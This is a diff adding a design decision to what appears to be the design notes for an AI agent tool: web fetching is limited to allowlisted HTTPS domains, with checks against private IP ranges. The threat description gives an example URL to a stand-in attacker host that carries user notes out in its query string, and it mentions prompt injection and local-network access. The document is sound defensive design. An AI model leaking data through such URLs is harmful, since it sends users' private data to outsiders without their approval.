@@ -299,6 +299,23 @@ run. The CLI keeps working on top of that.
 5. The audit log, safety layer and grants do not change: the UI is just another way
    to answer yes or no, like `input()` today.
 
+### D6: web access only to allowlisted domains (decided 2026-10-17)
+
+V0.7's opportunity scout and research need the web, the largest risk since
+publishing. Besides injection at scale, a model that picks URLs can **leak data in the
+URL itself** (`https://attacker.example/?notes=...`): merely fetching it sends the
+data, with no text for the user to approve. It could also reach the local network
+(`localhost`, `192.168.x.x`).
+
+**Chosen: feeds plus allowlisted pages.** RSS/Atom feeds come from a fixed list the
+user configures, and `web_fetch` reaches only domains on `WEB_ALLOWLIST`: HTTPS only,
+redirects only within the list, every resolved IP checked against private, loopback
+and link-local ranges, no cookies or credentials, size and time limits. Exfiltration
+is then possible only to domains the user trusts. **Rejected for now:** a web search
+API with arbitrary result URLs (new key and cost; model-chosen URLs would need a
+prompt on every fetch). It stays a separate decision if allowlisted research proves
+too narrow.
+
 ## V0.4+ (not built)
 
 Do not add these until the previous milestone is approved:
